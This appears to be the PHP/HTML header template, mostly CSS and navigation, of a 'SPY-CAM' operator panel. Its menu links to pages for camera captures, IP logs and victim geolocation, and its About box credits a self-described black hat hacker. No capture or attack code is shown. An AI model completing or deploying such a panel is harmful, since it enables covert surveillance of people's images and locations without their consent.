

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SPY-CAM</title>
    <link rel="icon" type="image/png" href="../images/favicon.ico">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
    
    body {
        background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
        padding-top: 20px;
        padding-bottom: 50px;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        color: #e0e0e0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    
    .gallery-container {
        padding: 20px 0;
        flex: 1;
    }
    
    .card {
        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        margin-bottom: 25px;
        border-radius: 15px;
        overflow: hidden;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        background: rgba(30, 41, 59, 0.7);
        backdrop-filter: blur(10px);
        position: relative;
    }
    
    .card::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, rgba(102, 126, 234, 0.5), transparent);
    }
    
    .card:hover {
        transform: translateY(-8px) scale(1.02);
        box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        border-color: rgba(102, 126, 234, 0.3);
    }
    
    .card-img-top {
        height: 220px;
        object-fit: cover;
        transition: all 0.5s ease;
        filter: brightness(0.9);
    }
    
    .card:hover .card-img-top {
        transform: scale(1.05);
        filter: brightness(1.1);
    }
    
    .card-body {
        padding: 20px;
        background: transparent;
    }
    
    .card-title {
        font-size: 1.1rem;
        font-weight: 600;
        margin-bottom: 10px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        color: #ffffff;
        text-align: center;
        letter-spacing: 0.5px;
    }
    
    .card-text {
        font-size: 0.9rem;
        color: #94a3b8;
        text-align: center;
    }
    
    .btn-view {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 10px;
        font-weight: 500;
        transition: all 0.3s ease;
        width: 100%;
        position: relative;
        overflow: hidden;
    }
    
    .btn-view:hover {
        background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
        transform: translateY(-2px);
        box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        color: #ffffff;
    }
    
    .btn-view::after {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        transition: left 0.5s ease;
    }
    
    .btn-view:hover::after {
        left: 100%;
    }
    
    .btn-delete {
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 10px;
        font-weight: 500;
        transition: all 0.3s ease;
        width: 100%;
    }
    
    .btn-delete:hover {
        background: linear-gradient(135deg, #f5576c 0%, #f093fb 100%);
        transform: translateY(-2px);
        box-shadow: 0 5px 20px rgba(245, 87, 108, 0.4);
        color: #ffffff;
    }
    
    .button-group {
        display: flex;
        gap: 12px;
        margin-top: 15px;
    }
    
    .header {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.9) 0%, rgba(30, 41, 59, 0.9) 100%);
        backdrop-filter: blur(10px);
        color: white;
        padding: 40px 0;
        margin-bottom: 40px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        position: relative;
        overflow: hidden;
    }
    
    .header::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 2px;
        background: linear-gradient(90deg, #667eea, #f093fb, #f5576c);
    }
    
    .header h1 {
        font-weight: 700;
        font-size: 2.8rem;
        background: linear-gradient(135deg, #667eea 0%, #f093fb 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 15px;
        text-shadow: 0 2px 10px rgba(102, 126, 234, 0.2);
    }
    
    .header p {
        color: #94a3b8;
        font-size: 1.1rem;
        opacity: 0.9;
    }
    
    .modal-content {
        background: rgba(30, 41, 59, 0.95);
        backdrop-filter: blur(20px);
        border-radius: 20px;
        overflow: hidden;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 20px 50px rgba(0,0,0,0.4);
        color: #e0e0e0;
    }
    
    .modal-body {
        padding: 0;
    }
    
    .modal-img {
        width: 100%;
        max-height: 70vh;
        object-fit: contain;
        background: #0f172a;
    }
    
    .modal-footer {
        justify-content: space-between;
        background: rgba(15, 23, 42, 0.8);
        border-top: 1px solid rgba(255, 255, 255, 0.1);
        padding: 20px;
    }
    
    .image-info {
        font-size: 0.95rem;
        color: #94a3b8;
    }
    
    .loading {
        text-align: center;
        padding: 80px 0;
        font-size: 1.3rem;
        color: #94a3b8;
    }
    
    .no-images {
        text-align: center;
        padding: 80px 0;
        font-size: 1.3rem;
        color: #94a3b8;
    }
    
    .filters {
        margin-bottom: 30px;
        background: rgba(30, 41, 59, 0.7);
        backdrop-filter: blur(10px);
        padding: 20px;
        border-radius: 15px;
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .input-group-text {
        background: rgba(15, 23, 42, 0.8);
        border: 1px solid rgba(255, 255, 255, 0.1);
        color: #94a3b8;
    }
    
    #search-input, #sort-by {
        background: rgba(15, 23, 42, 0.8);
        border: 1px solid rgba(255, 255, 255, 0.1);
        color: #e0e0e0;
    }
    
    #search-input:focus, #sort-by:focus {
        background: rgba(15, 23, 42, 0.9);
        border-color: #667eea;
        box-shadow: 0 0 0 0.25rem rgba(102, 126, 234, 0.25);
        color: #ffffff;
    }
    
    .footer {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.9) 0%, rgba(30, 41, 59, 0.9) 100%);
        color: #94a3b8;
        padding: 25px 0;
        text-align: center;
        margin-top: 50px;
        border-top: 1px solid rgba(255, 255, 255, 0.1);
        position: relative;
    }
    
    .footer::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, rgba(102, 126, 234, 0.5), transparent);
    }
    
    .footer a {
        color: #667eea;
        text-decoration: none;
        transition: all 0.3s ease;
        font-weight: 500;
    }
    
    .footer a:hover {
        color: #f093fb;
        text-shadow: 0 0 10px rgba(240, 147, 251, 0.3);
    }
    
    .toast-container {
        position: fixed;
        top: 30px;
        right: 30px;
        z-index: 1060;
    }
    
    .toast {
        background: rgba(30, 41, 59, 0.95);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        color: white;
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    }
    
    .modal-header.bg-danger {
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%) !important;
        color: white;
        border-bottom: none;
    }
    
    .btn-close-white {
        filter: invert(1) grayscale(100%) brightness(200%);
    }
    
    .delete-modal .modal-content {
        background: rgba(30, 41, 59, 0.95);
        backdrop-filter: blur(20px);
    }
    
    .delete-modal .modal-header {
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        color: white;
    }
    
    .delete-modal .modal-body {
        padding: 30px;
        text-align: center;
    }
    
    .delete-modal .modal-footer {
        border-top: 1px solid rgba(255, 255, 255, 0.1);
        background: transparent;
    }
    
    @media (max-width: 768px) {
        .card-img-top {
            height: 180px;
        }
        
        .header h1 {
            font-size: 2.2rem;
        }
        
        .button-group {
            flex-direction: column;
        }
        
        .btn-view, .btn-delete {
            padding: 12px;
        }
    }
    
    /* Custom scrollbar */
    ::-webkit-scrollbar {
        width: 10px;
    }
    
    ::-webkit-scrollbar-track {
        background: rgba(30, 41, 59, 0.5);
    }
    
    ::-webkit-scrollbar-thumb {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        border-radius: 5px;
    }
    
    ::-webkit-scrollbar-thumb:hover {
        background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
    }
    
    /* Animation for loading spinner */
    @keyframes float {
        0%, 100% { transform: translateY(0px); }
        50% { transform: translateY(-10px); }
    }
    
    .loading i {
        animation: float 2s ease-in-out infinite;
        color: #667eea;
    }
    
    /* Animation for gallery items */
    @keyframes fadeInUp {
        from {
            opacity: 0;
            transform: translateY(30px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }
    
    .card {
        animation: fadeInUp 0.5s ease-out forwards;
        animation-delay: calc(var(--index, 0) * 0.05s);
    }
    
    /* Card hover shine effect */
    .card::after {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(
            90deg,
            transparent,
            rgba(255, 255, 255, 0.05),
            transparent
        );
        transition: left 0.7s ease;
        pointer-events: none;
    }
    
    .card:hover::after {
        left: 100%;
    }
    
    /* Filter section styling */
    .input-group {
        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        border-radius: 10px;
        overflow: hidden;
    }
    
    .input-group:focus-within {
        box-shadow: 0 5px 20px rgba(102, 126, 234, 0.2);
    }
    
    /* Download button in modal */
    #download-link {
        background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
        border: none;
        padding: 10px 25px;
        border-radius: 10px;
        font-weight: 500;
        transition: all 0.3s ease;
    }
    
    #download-link:hover {
        background: linear-gradient(135deg, #66BB6A 0%, #388E3C 100%);
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
    }
    
    /* Delete confirmation modal specific */
    #deleteModal .modal-content {
        background: rgba(30, 41, 59, 0.98);
    }
    
    #deleteModal .modal-body {
        padding: 30px;
    }
    
    #delete-image-name {
        color: #f093fb;
        font-family: monospace;
        font-size: 1.1rem;
        word-break: break-all;
    }
    
    /* Success toast */
    .toast.bg-success {
        background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%) !important;
    }
    
    /* Danger toast */
    .toast.bg-danger {
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%) !important;
    }
    
    /* Warning toast */
    .toast.bg-warning {
        background: linear-gradient(135deg, #ffb347 0%, #ffcc33 100%) !important;
    }
    
    /* Image counter */
    .image-counter {
        position: absolute;
        top: 20px;
        right: 20px;
        background: rgba(15, 23, 42, 0.8);
        padding: 8px 15px;
        border-radius: 20px;
        font-size: 0.9rem;
        color: #94a3b8;
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
    </style>
    
    <?php if (isset($additionalStyles)) echo $additionalStyles; ?>
</head>
<body>
    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-dark fixed-top">
        <div class="container">
            <a class="navbar-brand" href="panel.php">
                SPY CAM
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link <?php echo basename($_SERVER['PHP_SELF']) == 'panel.php' ? 'active' : ''; ?>" href="panel.php">
                            <i class="fas fa-home me-1"></i> Panel
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link <?php echo basename($_SERVER['PHP_SELF']) == 'captures.php' ? 'active' : ''; ?>" href="captures.php">
                            <i class="fas fa-images me-1"></i> Captures
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link <?php echo basename($_SERVER['PHP_SELF']) == 'ip_log_viewer.php' ? 'active' : ''; ?>" href="ip_log_viewer.php">
                            <i class="fas fa-network-wired me-1"></i> IP Log Viewer
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link <?php echo basename($_SERVER['PHP_SELF']) == 'geolocation.php' ? 'active' : ''; ?>" href="geolocation.php">
                            <i class="fas fa-street-view me-1"></i> Geolocation
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#" data-bs-toggle="modal" data-bs-target="#aboutModal">
                            <i class="fas fa-info-circle me-1"></i> About
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    
    <!-- About Modal -->
    <div class="modal fade" id="aboutModal" tabindex="-1" aria-labelledby="aboutModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="aboutModalLabel">About</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body text-center">
                    <img src="/captures/spy-cam.jpg" alt="ATHEX BLACK HAT" class="profile-image">
                    
                    <div class="about-text">
                        <div class="about-name">ATHEX BLACK HAT</div>
                        <div class="about-title">BLACK HAT HACKER AND DEVELOPER</div>
                        </p>
                    </div>
                    
                    <div class="social-links">
                        <a href="https://www.github.com/Athexhacker/" target="_blank" class="social-link github" title="GitHub">
                            <i class="fab fa-github"></i>
                        </a>
                        
                        <a href="https://www.instagram.com/itx_athex86" target="_blank" class="social-link instagram" title="Instagram">
                            <i class="fab fa-instagram"></i>
                        </a>
		    </div>
                        <div class="footer"><a href="https://https://athex-software-house.netlify.app.br" target="_blank">ATHEX I.T HOUSE</a></div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="content-container">
        <!-- Content will be inserted here -->
